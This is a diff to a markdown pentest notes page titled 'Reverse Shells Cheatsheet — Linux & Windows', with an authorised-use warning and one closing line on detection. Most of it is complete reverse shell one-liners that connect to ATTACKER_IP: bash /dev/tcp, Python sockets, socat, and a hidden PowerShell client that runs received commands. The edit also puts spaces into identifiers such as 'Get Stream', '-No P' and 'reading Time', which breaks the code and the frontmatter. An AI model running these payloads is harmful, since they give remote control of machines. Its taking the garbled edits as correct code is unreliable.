@@ -6,14 +6,17 @@ tags: ["reverse-shell", "linux", "windows", "pentest", "cheatsheet"]
 category: "notes"
 subcategory: "security"
 difficulty: "Advanced"
-readingTime: "12 min read"
+reading Time: "12 min read"
 ---
 
 # Reverse Shells Cheatsheet — Linux & Windows
 
-> [!IMPORTANT]
-> **Authorized Testing Only**
-> Use these techniques only in lab environments, CTF challenges, or systems you own or have explicit written permission to test. Unauthorized access is illegal.
+
+<Callout type="warning" title="Defensive & Authorized Auditing Purposes Only">
+**Authorized Testing Only**
+Use these techniques only in lab environments, CTF challenges, or systems you own or have explicit written permission to test. Unauthorized access is illegal.
+</Callout>
+
 
 ## Overview
 
@@ -26,6 +29,7 @@ Start a Netcat listener on your attack machine before executing a payload on the
 ```bash
 nc -lvnp 4444
 rlwrap nc -lvnp 4444
+
 ```
 
 ## Linux Reverse Shells
@@ -36,31 +40,35 @@ Replace ATTACKER_IP and PORT with your listener address.
 
 ```bash
 bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1
+
 ```
 
 ### Python
 
 ```bash
 python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+
 ```
 
 ### Socat
 
 ```bash
 socat TCP:ATTACKER_IP:PORT EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
+
 ```
 
 ## Windows Reverse Shells
 
-### PowerShell
+### Power Shell
 
 ```powershell
-powershell -NoP -W Hidden -Exec Bypass -Command "$c=New-Object Net.Sockets.TCPClient('ATTACKER_IP',PORT);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([Text.Encoding]::ASCII.GetBytes($r2));$s.Write($sb,0,$sb.Length)}"
+powershell -No P -W Hidden -Exec Bypass -Command "$c=New-Object Net.Sockets.TCPClient('ATTACKER_IP',PORT);$s=$c.Get Stream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).Get String($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([Text.Encoding]::ASCII.Get Bytes($r2));$s.Write($sb,0,$sb.Length)}"
+
 ```
 
 ## Defensive Detection Indicators
 
-Monitor outbound connections, suspicious process command lines (Event 4688), and PowerShell Script Block Logging (Event 4104).
+Monitor outbound connections, suspicious process command lines (Event 4688), and Power Shell Script Block Logging (Event 4104).
 
 ---
 
